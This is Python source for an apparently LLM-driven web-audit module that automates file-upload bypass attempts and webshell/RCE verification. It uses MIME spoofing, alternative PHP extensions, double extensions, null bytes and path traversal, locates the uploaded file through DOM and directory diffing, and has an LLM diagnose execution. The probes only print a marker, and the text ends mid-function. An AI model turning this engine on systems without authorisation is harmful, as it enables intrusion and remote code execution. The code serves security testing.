"""
模块 4：Webshell 上传绕过与命令执行 (RCE) 验证 (LLM 决策 + 自动纠错循环 Agent 模式)

架构设计：
  1. Strategy Agent: 由 LLM 根据目标环境（URL、表单结构、accept限制）动态生成最佳绕过策略
  2. Request Executor: Python 构建精准的多部分表单 (multipart/form-data) 请求
  3. Path Analysis Agent: LLM 结合智能 DOM 差异对比解析重命名后的 Webshell 真实路径
  4. Diagnostic Agent & Self-Correction Loop: LLM 对 Webshell 响应进行漏洞诊断，若未解析或报错，自动提示纠错建议并进行下一轮重试
"""
import os
import uuid
import urllib.parse
import re
import time
from typing import Dict, Any, List, Optional, Set
from pydantic import BaseModel, Field
from langchain_core.prompts import ChatPromptTemplate
from bs4 import BeautifulSoup

from web_audit.modules.base_module import BaseModule
from web_audit.core.requester import Requester
from web_audit.core.llm_factory import get_structured_llm, get_llm


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Pydantic 结构化输出模型
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class BypassStrategyItem(BaseModel):
    name: str = Field(description="绕过策略名称，例如 'MIME Spoofing', 'PHTML Extension', 'Case Variation'")
    filename_suffix: str = Field(description="建议的文件后缀/扩展名（包含点号），例如 '.php', '.phtml', '.php5', '.phar', '.jpg.php', '.php%00.jpg'")
    content_type: str = Field(description="建议的 Content-Type 标头，例如 'image/jpeg', 'image/png', 'application/x-httpd-php'")
    rationale: str = Field(description="LLM 设计该策略的依据和推理")


class StrategyGenerationResult(BaseModel):
    strategies: List[BypassStrategyItem] = Field(
        description="由 LLM 为当前目标表单定制的 3 到 6 个绕过策略列表，按成功概率从高到低排序。"
    )


class ExtractPathResult(BaseModel):
    extracted_path: Optional[str] = Field(
        description="从上传响应或 DOM 内容中提取出的相对路径或绝对 URL。如果找不到路径则返回 null。",
        default=None
    )
    reason: str = Field(description="提取逻辑与依据说明")


class DiagnosticResult(BaseModel):
    status: str = Field(
        description="诊断状态类别，必须是以下之一: 'SUCCESS' (探针成功解析执行), 'PATH_404' (路径404错误/文件名变动), 'NOT_EXECUTED' (服务器未解析PHP，源码直接暴露/被当作纯文本或图片输出), 'WAF_BLOCKED' (被拦截), 'UNKNOWN' (其他)"
    )
    is_vuln: bool = Field(
        description="是否确凿证明存在安全漏洞（当且仅当探针标志被服务器动态引擎解析执行时为 True）"
    )
    explanation: str = Field(description="诊断依据和详细推理过程")
    recommended_action: str = Field(
        description="针对当前失败原因给出的自动纠错调整建议，例如 '建议更换 .phtml 后缀', '建议到列表页寻找重命名后的文件名'"
    )


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LangChain Prompts
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

STRATEGY_GEN_PROMPT = ChatPromptTemplate.from_messages([
    ("system", """你是一个顶级 Web 安全专家，专注于文件上传漏洞与绕过测试。
你的任务是根据给定的上传接口信息，分析目标的防御机制（如前端 accept 限制、常见后端语言、中间件容器），动态定制一组最具针对性的绕过策略。

常用绕过思路提示：
1. **Direct Upload**: 基础直接上传 (.php)
2. **MIME Type Spoofing**: 将 Content-Type 伪造为 image/jpeg 或 image/png
3. **Alternative Extensions**: 备选可执行后缀 (.php3, .php5, .phtml, .phar, .inc)
4. **Case Obfuscation**: 大小写混合 (.PhP, .pHtml)
5. **Double Extensions**: 双后缀 (.jpg.php, .png.php)
6. **Null Byte / Path Traversal**: 截断或路径穿越 (../shell.php)

⚠️ **输出格式要求**（严格遵守）：
你必须输出一个 JSON 对象，**必须包含且仅包含一个名为 `strategies` 的数组字段**。
每个策略对象必须包含以下字段：
- `name`: 策略名称（字符串）
- `filename_suffix`: 文件后缀（字符串，如 ".php", ".phtml"）
- `content_type`: Content-Type（字符串，如 "image/jpeg"）
- `rationale`: 策略依据（字符串）

示例输出格式：
{{"strategies": [{{"name": "Direct PHP", "filename_suffix": ".php", "content_type": "application/x-httpd-php", "rationale": "基础测试"}}]}}

请输出 3 到 6 个结构化的策略组合。"""),
    ("human", """目标上传接口: {action_url}
表单文件字段名: {file_param}
前端声明允许的 accept 类型: {accept_types}
页面标题/上下文: {page_title}

请为该接口生成最有可能绕过防御的策略列表。记住：输出的 JSON 必须包含 `strategies` 字段。""")
])


PATH_EXTRACT_PROMPT = ChatPromptTemplate.from_messages([
    ("system", """你是一个专业的安全分析助手。我刚在服务器上上传了一个名为 `{filename}` 的文件。
请从下面的 HTTP 响应体中（可能是 JSON, HTML, 或者是包含 JavaScript 的代码）寻找并提取出这个文件被存放在服务器上的最终访问路径。

提取原则：
1. 可能是一个直接的 URL (http://...)
2. 也可能是一个相对路径 (如 /uploads/shell.php, img/avatars/shell.jpg)
3. 或者是 JSON 字段中的路径，如 {{"status":"success", "url":"/uploads/123.php"}}
4. 如果响应只返回了成功但没有路径，或者返回了失败，请返回 null。"""),
    ("human", """响应状态码: {status_code}
文件名: {filename}

【服务器响应内容】:
{response_body}

请提取保存路径。""")
])


DIAGNOSTIC_PROMPT = ChatPromptTemplate.from_messages([
    ("system", """你是一个专业的 Web 漏洞诊断与自纠错智能体。
我们在目标服务器上通过文件上传提交了一个探针代码，探针包含原生打印标记 `VULN_VERIFIED_MARKER_UPLOAD`。
现在我们访问了推测的 Webshell 访问路径，请根据返回的 HTTP 响应，严格诊断当前状态：

🔥 **判断标准**:
1. **SUCCESS (漏洞确凿)**:
   - 响应中出现了 `VULN_VERIFIED_MARKER_UPLOAD` 标记，**且**前面没有 `<?php` 或 `<%` 等原始脚本标签。
   - 说明服务器代码解释器（如 PHP/ASP 引擎）成功解析并执行了探针，确认造成了任意代码执行/Webshell 漏洞！

2. **NOT_EXECUTED (代码未解析)**:
   - 响应中虽然出现了 `VULN_VERIFIED_MARKER_UPLOAD`，但同时依然能看到 `<?php` 或 `echo` 源码，说明文件被服务器当作纯文本或图片返回了，未能触发代码解析。
   - 建议：提示纠错模块更换更具兼容性的解析后缀（如 .phtml, .php5）。

3. **PATH_404 (路径错误)**:
   - 响应状态码为 404 或页面提示 File Not Found。说明文件落地路径推算错误，或者服务器对文件进行了重命名。
   - 建议：提示纠错模块从页面 DOM 差异或列表页中寻找新的文件名。

4. **WAF_BLOCKED (被拦截/拒绝)**:
   - 状态码 403/406 或页面提示安全拦截。

请给出严谨的诊断判定以及针对性的自纠错建议。"""),
    ("human", """尝试的 Payload 文件名: {filename}
访问的 Webshell URL: {webshell_url}
HTTP 状态码: {status_code}

【访问 Webshell 得到的响应内容】:
{response_text}

请分析诊断并给出结构化结果。""")
])


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 主模块实现：LLM 决策 + 自动纠错循环
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class UnifiedUploadAuditModule(BaseModule):
    name = "unified_upload_audit"

    def __init__(self, requester: Requester):
        super().__init__(requester)

        # 绑定结构化 LLM Chains
        self._strategy_chain = STRATEGY_GEN_PROMPT | get_structured_llm(StrategyGenerationResult)
        self._path_chain = PATH_EXTRACT_PROMPT | get_structured_llm(ExtractPathResult)
        self._diag_chain = DIAGNOSTIC_PROMPT | get_llm().with_structured_output(DiagnosticResult, method="json_mode")

        # PHP 无害探针标记（用于 PHP 类后缀策略）
        self.webshell_content = b"<?php echo 'VULN_VERIFIED_MARKER_UPLOAD'; ?>"
        # ASP 无害探针标记（用于 ASP/ASPX 类后缀策略）
        self.asp_webshell_content = b"<% Response.Write(\"VULN_VERIFIED_MARKER_UPLOAD\") %>"
        # JSP 无害探针标记（用于 JSP 类后缀策略）
        self.jsp_webshell_content = b"<% out.println(\"VULN_VERIFIED_MARKER_UPLOAD\"); %>"

        # 上传目录基线（上传前快照，用于对比新增文件）
        self._upload_dir_baseline = set()
        # 页面级资源基线（上传前各页面的 img/link/script URL，用于对比新增资源）
        self._page_img_baseline = {}

    def run(self, url: str, context: Dict[str, Any] = None) -> Dict[str, Any]:
        result = self._base_result(url)
        upload_forms = (context or {}).get("upload_forms", [])

        if not upload_forms:
            result["summary"] = "上下文中没有提供任何上传端点信息"
            return result

        print(f"  [UploadAgent] 启动 LLM 智能决策与自纠错上传漏洞测试 Agent (端点数: {len(upload_forms)})...")

        # ── 自动扩展：从已发现的上传点推导出同类"增/改"操作的上传端点 ─────────
        # 同一系统的 upload/insert/update/edit 通常共用同一套文件存储逻辑，
        # 所以先提取 base_page，然后对 action=update/edit/avatar/image 等都发探测请求看看能不能上传

        # 1. scan action_pages 页面里所有 "已知可能用于文件操作" 的 action 变体
        action_variants = []
        for _vform in upload_forms:
            _vu = _vform.get("source_url", "") or _vform.get("action_url", "") or ""
            base_url = urllib.parse.urlparse(_vu)
            base_path = base_url.path
            base_domain = base_url.netloc

            # 尝试从 URL 中推断 "父级" 页面名（如 shirt.php, avatar.php）
            import re
            path_match = re.search(r'([^/?]+\.php)', base_path)
            page_name = path_match.group(1) if path_match else None

            if page_name:
                # 对同一页面的不同 action 做 HTTP 请求探测是否有文件上传控件
                potential_actions = ["update", "edit", "update_image", "avatar", "image", "upload", "save"]
                for act in potential_actions:
                    # 修复：必须包含 scheme (https://)，否则 requester.get() 会报 "No scheme supplied" 错误
                    candidate = f"{base_url.scheme}://{base_domain}{base_path.split(page_name)[0]}{page_name}?action={act}"
                    try:
                        cand_resp = self.requester.get(candidate)
                        if cand_resp and cand_resp.text and len(cand_resp.text) > 500:
                            from web_audit.core.parser import PageParser
                            cp = PageParser(cand_resp.text, candidate)
                            upload_candidates = cp.get_upload_forms()
                            if upload_candidates:
                                action_variants.append({
                                    "action_url": candidate,
                                    "source_url": candidate,
                                    "file_input_names": [f["inputs"][0]["name"] if f["inputs"] else "file"],
                                    "accepted_types": upload_candidates[0].get("accepted_types", []) if upload_candidates else [],
                                    "found_on_page": candidate,
                                    "referer_url": _vform.get("source_url", ""),
                                    "action": act,
                                    "base_page": page_name,
                                    "found_via": f"action={act} 变体探测"
                                })
                    except Exception:
                        continue

        # 按发现顺序排：已发现的 upload_forms 排最前，新增的变体放后面
        all_forms = list(upload_forms) + action_variants

        for form_idx, form in enumerate(all_forms, 1):
            action_url = form.get("action_url") or url
            file_params = form.get("file_input_names", [])
            file_param = file_params[0] if file_params else "file"
            accept_types = form.get("accepted_types", [])
            source_page = form.get("found_on_page") or form.get("source_url") or action_url

            print(f"\n  [{form_idx}/{len(all_forms)}] 正在为端点 [{action_url}] 启动 Agent 决策链 (参数: '{file_param}')...")

            # ── 阶段 1: LLM 动态策略生成 ─────────────────────────────
            strategies = self._generate_llm_strategies(
                action_url=action_url,
                file_param=file_param,
                accept_types=accept_types,
                page_title=source_page
            )
            print(f"  [StrategyAgent] LLM 成功生成 {len(strategies)} 组针对性绕过策略。")

            # 收集表单其他额外隐藏字段（⚠️ 必须提前：后续多个步骤需要）
            form_data = self._extract_extra_form_fields(source_page, action_url)

            # 收集 baseline DOM 链接（上传 POST 后的差异对比）
            observation_pages = self._build_observation_pages(source_page, url, action_url, form)
            baseline_links = self._collect_baseline_links(observation_pages)

            # 发现上传目录（从页面 img src 等链接中提取）
            discovered_upload_dirs = self._discover_upload_directories(observation_pages)

            # ── 关键修复：将相对路径转换为完整 URL ──
            # _discover_upload_directories 返回的是路径部分（如 /logo/），
            # 但后续代码（_detect_new_files_in_dirs）需要完整 URL
            if discovered_upload_dirs:
                base_url_for_dirs = source_page or action_url or url
                normalized_dirs = []
                for d in discovered_upload_dirs:
                    if d.startswith(('http://', 'https://')):
                        normalized_dirs.append(d)
                    else:
                        full_url = urllib.parse.urljoin(base_url_for_dirs, d)
                        normalized_dirs.append(full_url)
                discovered_upload_dirs = normalized_dirs
                print(f"      [UploadDir] 规范化上传目录: {discovered_upload_dirs}")

            # 收集 baseline 网络资源（Playwright 捕获，用于检测上传后的新资源）
            baseline_resources = set()
            for page_url in observation_pages:
                try:
                    # 使用刷新版本，确保捕获到完整的数据
                    resources, dom_links = self._playwright_capture_with_refresh(
                        page_url,
                        self.requester.session.cookies
                    )
                    baseline_resources.update(resources)
                    baseline_resources.update(dom_links)  # 也包含 DOM 链接
                except Exception:
                    pass
            if baseline_resources:
                print(f"      [Baseline] 捕获到 {len(baseline_resources)} 个网络资源作为基线")

            # ── 新增：对发现的上传目录做基线快照（用于上传后对比新增文件） ──
            self._upload_dir_baseline = set()
            if discovered_upload_dirs:
                for dir_url in discovered_upload_dirs:
                    try:
                        print(f"      [Baseline] 正在快照目录: {dir_url}")
                        dir_resp = self.requester.get(dir_url)
                        if not dir_resp:
                            print(f"      [Baseline] 目录请求失败（无响应）: {dir_url}")
                            continue
                        if dir_resp.status_code != 200:
                            print(f"      [Baseline] 目录返回 status={dir_resp.status_code}，跳过: {dir_url}")
                            continue
                        # 从目录列表响应或 HTML 中提取文件链接
                        dir_links = self._extract_all_links(dir_resp.text)
                        for link in dir_links:
                            resolved = urllib.parse.urljoin(dir_url, link)
                            self._upload_dir_baseline.add(resolved)
                        # 也尝试正则提取
                        for m in re.findall(r'href=["\']([^"\']+)["\']', dir_resp.text, re.I):
                            resolved = urllib.parse.urljoin(dir_url, m)
                            self._upload_dir_baseline.add(resolved)
                        print(f"      [Baseline] 目录 {dir_url} 快照完成，发现 {len(dir_links)} 个链接")
                    except Exception as e:
                        print(f"      [Baseline] 快照目录失败 {dir_url}: {e}")
                if self._upload_dir_baseline:
                    print(f"      [Baseline] 上传目录基线: {len(self._upload_dir_baseline)} 个已知文件")
                else:
                    print(f"      [Baseline] 警告：未能从任何上传目录捕获基线文件")

            # ── 新增：页面级 img src 基线（用于检测上传后页面新增的图片/文件引用） ──
            # 这是目录基线的兜底方案：当目录列表被禁用时，通过页面上的 img src 变化来检测新文件
            self._page_img_baseline = {}
            for obs_page in observation_pages:
                try:
                    img_urls = self._collect_page_resource_urls(obs_page)
                    if img_urls:
                        self._page_img_baseline[obs_page] = img_urls
                        print(f"      [PageImg Baseline] {obs_page}: {len(img_urls)} 个资源 URL")
                except Exception:
                    pass

            # ── 先传一个无害测试文件，摸底文件存储路径规律 ─────────
            # 问题 2 修复：调用 _upload_test_file() 初始化 test_file_url
            test_file_url = self._upload_test_file(
                action_url, file_param, form_data, accept_types, source_page, observation_pages, baseline_links, discovered_upload_dirs, baseline_resources
            )

            # 问题 3 修复：初始化 form_vulnerable 标志
            form_vulnerable = False

            for strat_idx, strategy in enumerate(strategies, 1):
                strat_name = strategy.name
                suffix = strategy.filename_suffix
                content_type = strategy.content_type

                # 问题 1 修复：根据策略后缀动态生成文件名
                filename = f"{uuid.uuid4().hex[:8]}_shell{suffix}"

                # 问题 5 修复：根据文件后缀选择对应的探针内容
                shell_content = self._get_webshell_content(suffix)

                print(f"\n    → [Round {strat_idx}/{len(strategies)}] 执行策略: '{strat_name}' | 文件名: {filename} | Content-Type: {content_type}")

                # 发送物理上传请求
                resp = self._send_upload(action_url, file_param, filename, shell_content, content_type, form_data)
                if not resp:
                    print(f"      [-] 上传请求未收到有效响应，跳过。")
                    continue

                # ── 尝试寻找 Webshell 真实路径 ────────────────────────
                # 如果已通过测试文件找到 URL 规律，优先用该规律推测
                webshell_path = None
                if test_file_url and action_url:
                    # 从测试文件 URL 中推断 webshell 的存放规律（如 /uploads/ + UUID + 后缀）
                    test_base = test_file_url.rsplit('/', 1)[0] + '/'
                    webshell_path = self._infer_webshell_path(action_url, source_page, test_base, filename)

                # 问题 4 修复：传入实际 filename 而非空字符串
                path = webshell_path if webshell_path else self._extract_webshell_path(
                    resp, filename, baseline_links, action_url, strat_name, filename, source_page,
                    # 传入 observation_pages：上传阶段已发现的所有后台页面，
                    # 作为"已知可能展示上传文件的页面"进行扫描
                    observation_pages,
                    # 传入发现的上传目录
                    discovered_upload_dirs,
                    # 传入 baseline 网络资源（用于 Playwright 检测新资源）
                    baseline_resources
                )

                # ── 新增：目录对比检测（处理 MD5 重命名等场景） ──
                if not path and discovered_upload_dirs and hasattr(self, '_upload_dir_baseline'):
                    new_file = self._detect_new_files_in_dirs(discovered_upload_dirs, self._upload_dir_baseline)
                    if new_file:
                        print(f"      [NewFile Detect] 通过目录对比发现 webshell: {new_file}")
                        path = new_file

                # ── 新增：页面级资源对比检测（目录列表被禁用时的兜底） ──
                if not path and hasattr(self, '_page_img_baseline') and self._page_img_baseline:
                    new_file = self._detect_new_page_resources(observation_pages, self._page_img_baseline)
                    if new_file:
                        print(f"      [PageImg Diff] 通过页面资源对比发现 webshell: {new_file}")
                        path = new_file

                if not path:
                    print(f"      [-] 均未能定位上传文件路径，进行下一次策略迭代。")
                    continue

                base_for_join = source_page or action_url or url
                webshell_url = urllib.parse.urljoin(base_for_join, path)
                print(f"      [+] 推演得到 Webshell 目标 URL: {webshell_url}")

                # ── 阶段 4: 访问 Webshell 并发起 LLM 诊断与自纠错 ────
                diag_result = self._verify_and_diagnose(webshell_url, filename)

                if not diag_result:
                    continue

                if diag_result.is_vuln or diag_result.status == "SUCCESS":
                    print(f"\n    🚨🚨 [AGENT 确认漏洞] 策略 '{strat_name}' 突破成功！探针已被动态引擎成功执行！🚨🚨")
                    print(f"    - 分析说明: {diag_result.explanation}")

                    result["findings"].append({
                        "url": action_url,
                        "strategy": strat_name,
                        "payload_file": filename,
                        "shell_path": webshell_url,
                        "rce_output": diag_result.explanation,
                        "severity": "Critical"
                    })
                    form_vulnerable = True
                    break
                else:
                    print(f"      [LLM 诊断状态: {diag_result.status}] {diag_result.explanation[:80]}")
                    print(f"      [💡 自纠错建议]: {diag_result.recommended_action}")

                    # 自动纠错机制：如果诊断提示路径 404，尝试去网络拦截器刷新寻找
                    if diag_result.status == "PATH_404" and form.get("referer_url"):
                        print(f"      [↺ 纠错重试] 尝试触发 Playwright 网络层拦截...")
                        net_urls = self.requester.fetch_network_resources(form.get("referer_url"))

                        # 评分匹配替代原 `filename.split("_")[0]` 前缀匹配 —— 处理重命名场景
                        best_retry, best_retry_score = None, -1
                        shell_extensions = ['.php', '.phtml', '.php3', '.php4', '.php5', '.phar']
                        upload_dirs = ['/uploads/', '/files/', '/tmp/', '/upload/', '/media/']

                        for net_u in net_urls:
                            score = 0
                            net_lower = net_u.lower()

                            if any(ud in net_lower for ud in upload_dirs):
                                score += 10
                            if any(ext in net_lower for ext in shell_extensions):
                                score += 10
                            if '?' not in net_lower:
                                score += 3
                            # 原始文件名的任何部分可能仍在（重命名可能截断 UUID 但不一定完全消失）
                            original_parts = set(filename.replace(".", "_").split("_"))
                            if any(p in net_lower for p in original_parts if len(p) >= 3):
                                score += 15

                            if score > best_retry_score:
                                best_retry_score, best_retry = score, net_u

                        if best_retry and best_retry_score >= 15:
                            print(f"      [↺ 纠错重试] 发现网络层新路径: {best_retry} (score={best_retry_score})")
                            retry_diag = self._verify_and_diagnose(best_retry, filename)
                            if retry_diag and (retry_diag.is_vuln or retry_diag.status == "SUCCESS"):
                                print(f"\n    🚨🚨 [AGENT 自动纠错成功] 通过网络层捕获成功定位并解析 Webshell！🚨🚨")
                                result["findings"].append({
                                    "url": action_url,
                                    "strategy": strat_name + " (Self-Correction via Network)",
                                    "payload_file": filename,
                                    "shell_path": best_retry,
                                    "rce_output": retry_diag.explanation,
                                    "severity": "Critical"
                                })
                                form_vulnerable = True
                                break

            # 问题 3 修复：如果当前端点已确认漏洞，跳过剩余端点的测试
            if form_vulnerable:
                print(f"  [UploadAgent] 端点 [{action_url}] 已确认存在漏洞，跳过剩余端点测试。")
                break

        result["summary"] = f"LLM 上传漏洞测试完成。发现高危 Webshell/RCE 漏洞: {len(result['findings'])} 个。"
        return result

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    # 辅助方法与 Agent 环节实现
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    def _generate_llm_strategies(self, action_url: str, file_param: str, accept_types: List[str], page_title: str) -> List[BypassStrategyItem]:
        """调用 Strategy Agent 动态生成最佳绕过策略。若 LLM 失败则退回基础备用策略。"""
        try:
            res: StrategyGenerationResult = self._strategy_chain.invoke({
                    "action_url": action_url,
                    "file_param": file_param,
                    "accept_types": ", ".join(accept_types) if accept_types else "无限制",
                    "page_title": page_title,
            })
            if res and res.strategies:
                    return res.strategies
        except Exception as e:
            print(f"  [StrategyAgent] LLM 生成策略失败 ({e})，尝试手动解析...")
            # 尝试手动解析（处理字段名不匹配的情况）
            try:
                # 从异常中获取原始响应，尝试手动修复
                import json
                raw_response = str(e)
                # 尝试从错误信息中提取 JSON
                if "bypass_strategies" in raw_response:
                    # LLM 用了错误的字段名，尝试手动解析
                    json_start = raw_response.find("{")
                    json_end = raw_response.rfind("}") + 1
                    if json_start >= 0 and json_end > json_start:
                        json_str = raw_response[json_start:json_end]
                        data = json.loads(json_str)
                        # 尝试从 bypass_strategies 或其他字段中提取策略
                        strategies_data = data.get("bypass_strategies") or data.get("strategies") or []
                        if strategies_data:
                            parsed = []
                            for s in strategies_data[:6]:  # 最多 6 个
                                if isinstance(s, dict) and "filename_suffix" in s:
                                    parsed.append(BypassStrategyItem(
                                        name=s.get("name", "Unknown"),
                                        filename_suffix=s.get("filename_suffix", ".php"),
                                        content_type=s.get("content_type", "application/octet-stream"),
                                        rationale=s.get("rationale", "手动解析")
                                    ))
                            if parsed:
                                print(f"  [StrategyAgent] ✅ 手动解析成功，获取 {len(parsed)} 个策略。")
                                return parsed
            except Exception as parse_err:
                print(f"  [StrategyAgent] 手动解析也失败: {parse_err}")

            print(f"  [StrategyAgent] 降级为默认策略库。")

        # 默认降级策略库（增强版，覆盖更多场景）
        return [
            BypassStrategyItem(name="Direct PHP", filename_suffix=".php", content_type="application/x-httpd-php", rationale="基础直接上传测试"),
            BypassStrategyItem(name="MIME Spoofing", filename_suffix=".php", content_type="image/jpeg", rationale="Content-Type 伪造为图片"),
            BypassStrategyItem(name="Alternative Ext PHTML", filename_suffix=".phtml", content_type="image/jpeg", rationale="常见可执行扩展名绕过"),
            BypassStrategyItem(name="Alternative Ext PHP5", filename_suffix=".php5", content_type="image/jpeg", rationale="PHP5 拓展名绕过"),
            BypassStrategyItem(name="Alternative Ext PHP3", filename_suffix=".php3", content_type="image/jpeg", rationale="PHP3 拓展名绕过"),
            BypassStrategyItem(name="Alternative Ext PHAR", filename_suffix=".phar", content_type="image/jpeg", rationale="PHAR 拓展名绕过"),
            BypassStrategyItem(name="Case Obfuscation", filename_suffix=".PhP", content_type="image/jpeg", rationale="后缀大小写变异"),
            BypassStrategyItem(name="Double Extension", filename_suffix=".jpg.php", content_type="image/jpeg", rationale="双重后缀绕过"),
            BypassStrategyItem(name="Null Byte", filename_suffix=".php%00.jpg", content_type="image/jpeg", rationale="空字节截断"),
        ]

    def _get_post_upload_target_url(self, resp: Any, action_url: str) -> List[str]:
        """
        返回上传 POST 后需要重新渲染抓取 DOM 的候选 URL 列表。

        优先级（最可能包含新 img/src 文件的顺序）：
          1. resp.url        — POST-Redirect-GET 的最终着陆页
          2. resp.request.url — 原始 POST 目标（可能先渲染新链接后重定向）
          3. resp.history...  — 多跳重定向中的中间页
          4. action_url       — 上传表单页自身（最直接的上传后渲染位置）
        """
        candidates: List[str] = []

        # 1. 最终着陆页
        if resp.url:
            candidates.append(resp.url)

        # 2. requests 通过 resp.request 保留原始 POST 目标 URL
        if getattr(resp, "request", None) and resp.request.url:
            req_url = resp.request.url
            if req_url != resp.url and req_url not in candidates:
                    candidates.append(req_url)

        # 3. 跳转链中所有中间页
        for h in (resp.history or []):
            if h.url and h.url not in candidates:
                    candidates.append(h.url)

        # 4. 上传端点兜底
        if action_url and action_url not in candidates:
            candidates.append(action_url)

        # 按优先级排序：resp.url 第一，action_url 第二，其余追加
        ordered: List[str] = []
        for c in [resp.url, action_url]:
            if c and c in candidates:
                    ordered.append(c)
        for c in candidates:
            if c not in ordered:
                    ordered.append(c)

        return ordered[:4]  # 最多 4 个目标，保持速度

    def _extract_webshell_path(self, resp: Any, filename: str, baseline_links: Set[str], action_url: str, strat_name: str, original_filename: str = "", source_page: str = "", observation_pages: List[str] = None, discovered_upload_dirs: List[str] = None, baseline_resources: Set[str] = None) -> Optional[str]:
        """
        组合 LLM 响应分析、DOM 差异对比与兜底正则提取真实路径。

        搜索范围按优先级递增：
        1. 上传响应 JSON
        2. 上传接口返回页面 / 上传表单页
        3. 已知页面列表（文件管理、产品列表等可能展示上传文件的页面）
        4. 扫描发现的上传目录
        5. Playwright 网络资源检测（捕获新加载的资源）
        6. 正则兜底
        """
        path = None

        # 1. LLM 从上传响应中寻找路径
        if len(resp.text) >= 10:
            try:
                    extract_res: ExtractPathResult = self._path_chain.invoke({
                        "filename": filename,
                        "status_code": resp.status_code,
                        "response_body": resp.text[:2000]
                    })
                    if extract_res and extract_res.extracted_path:
                        ep = extract_res.extracted_path.strip()
                        if "/" in ep or "." in ep:
                            print(f"      [LLM PathAgent] 从响应中解析出路径: {ep}")
                            return ep
            except Exception as e:
                    pass

        # 2. 上传后重新渲染目标页面，抓取新 DOM 做差异对比
        time.sleep(0.3)
        post_targets = self._get_post_upload_target_url(resp, action_url)
        # ── 新增 ── 加入 source_page：很多 CMS 上传后图片会显示在上传表单页本身，而非接口响应 ─
        if source_page and source_page not in post_targets:
            post_targets.append(source_page)
        after_links: set = set()

        for target in post_targets:
            try:
                    html_text = self.requester.fetch_rendered_html(target)
                    if html_text:
                        after_links.update(self._extract_all_links(html_text))
            except Exception:
                    pass

        new_links_set = after_links - baseline_links

        # 2a. 新路径提取: 启发式 + UUID 部分匹配（处理服务器重命名场景）
        path = self._extract_path_via_dom_diff(new_links_set, baseline_links, filename, resp, discovered_upload_dirs)

        # 2b. 评分排序兜底（UUID 前缀存在时有效）
        if not path:
            path = self._find_best_shell_path(baseline_links, after_links, filename)
        if not path:
            path = self._find_fallback_shell_path(baseline_links, after_links, strat_name)

        if path:
            print(f"      [DOM Diff] 通过多页对比捕捉到新增资源: {path}")
            return path

        # 3. 扫描发现的上传目录（从页面 img src 等链接中提取的目录）
        if discovered_upload_dirs:
            path = self._scan_discovered_upload_dirs(discovered_upload_dirs, filename, action_url, source_page)
            if path:
                print(f"      [UploadDir Scan] 从发现的上传目录中找到 webshell: {path}")
                return path

        # 4. Playwright 网络资源检测（捕获上传后页面新加载的资源）
        if baseline_resources and observation_pages:
            path = self._detect_new_resources_via_playwright(observation_pages, baseline_resources, filename)
            if path:
                print(f"      [Playwright Detect] 通过网络资源差异检测找到 webshell: {path}")
                return path

        # 5. 正则兜底扫描（在上传响应原文中查找文件名）
        try:
            core_name = filename.split("_")[0]
            match = re.search(r'[\'"]([^\'"]*' + re.escape(core_name) + r'[^\'"]*)[\'"]', resp.text)
            if match:
                    path = match.group(1)
                    print(f"      [Regex Fallback] 提取到关联文件名路径: {path}")
                    return path
        except Exception:
            pass

        # 5. 扫描已知页面列表（observation_pages）寻找上传文件
        # 很多 CMS 上传后文件会显示在后台页面（文件管理器、产品列表等），
        # 而不在上传接口或表单页的响应中。
        if observation_pages:
            print(f"      [已知页面扫描] 扫描 {len(observation_pages)} 个已知页面查找上传文件...")
            shell_exts = ['.php', '.phtml', '.php3', '.php4', '.php5', '.phar', '.jsp', '.jspx', '.shtml']
            # 使用发现的上传目录，而非硬编码列表
            # discovered_upload_dirs 是绝对路径（如 https://xxx/logo/）
            # 需要同时提取路径部分用于匹配相对链接（如 ../logo/）
            known_upload_dirs = list(discovered_upload_dirs) if discovered_upload_dirs else []
            # 从已知上传目录中提取路径部分（用于匹配相对路径链接）
            known_upload_paths = []
            for d in known_upload_dirs:
                try:
                    parsed = urllib.parse.urlparse(d)
                    if parsed.path:
                        known_upload_paths.append(parsed.path)
                except Exception:
                    pass
            # 兜底：如果没发现上传目录，使用常见模式
            if not known_upload_dirs and not known_upload_paths:
                known_upload_paths = ['/uploads/', '/files/', '/tmp/', '/upload/', '/media/', '/logo/']
            ignore_kw = ["jquery", "bootstrap", "sweetalert", "datatables", "vendor/", "cdn", "jsdelivr", "/js/", "/css/"]

            def _link_in_upload_dir(link_text: str, page_url: str) -> bool:
                """检查链接是否在已知的上传目录中。支持相对路径解析。"""
                # 解析为绝对 URL
                resolved = urllib.parse.urljoin(page_url, link_text)
                resolved_path = urllib.parse.urlparse(resolved).path
                # 检查是否匹配任何已知上传目录
                for d in known_upload_dirs:
                    if d in resolved:
                        return True
                for p in known_upload_paths:
                    if p in resolved_path:
                        return True
                return False

            for page_url in observation_pages:
                    if not page_url or page_url == source_page or page_url == action_url:
                        continue  # 已扫过
                    try:
                        page_html = self.requester.fetch_rendered_html(page_url)
                        if not page_html:
                            continue
                        page_links = self._extract_all_links(page_html)
                        for link in page_links:
                            if any(kw in link.lower() for kw in ignore_kw):
                                continue
                            if _link_in_upload_dir(link, page_url) and any(
                                ext in link.lower() for ext in shell_exts
                            ):
                                # 解析为绝对 URL
                                resolved = urllib.parse.urljoin(page_url, link)
                                # 如果文件名包含 UUID 前缀则优先返回
                                base_name = resolved.split('?')[0].rsplit('/', 1)[-1].lower()
                                if original_filename and original_filename.split('_')[0].lower() in base_name:
                                    print(f"      [已知页面扫描] 命中 UUID 前缀匹配: {resolved}")
                                    return resolved
                                # 否则返回第一个上传目录中的可执行文件（大概率就是上传的文件）
                                print(f"      [已知页面扫描] 找到可执行文件: {resolved}")
                                if original_filename.split('_')[0].lower() not in base_name:
                                    continue  # 不是目标文件，继续
                                return resolved
                    except Exception:
                        continue

            # 5b. 如果 UUID 前缀匹配失败，返回上传目录 + 可执行扩展名的第一个结果
            for page_url in observation_pages:
